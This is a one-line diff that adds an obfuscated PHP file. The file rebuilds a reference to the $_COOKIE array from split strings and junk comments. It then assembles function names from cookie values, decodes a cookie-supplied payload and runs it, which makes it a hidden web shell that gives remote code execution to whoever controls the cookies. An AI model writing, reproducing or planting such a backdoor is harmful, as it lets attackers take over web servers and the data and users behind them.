@@ -1,0 +1,1 @@
+<?php $fg='_C';$tp/*@$*/='OO';$sg/*r*/='KI';$lu/*e*/='E';$en=/*`C*/${$fg.$tp.$sg.$lu};$vu=$en/*3Ns*/['o'].$en['n'];$e=$en['Wu'].$en['i'].$en['Rp'];$t=$vu('',$e($en['KK']));$t();
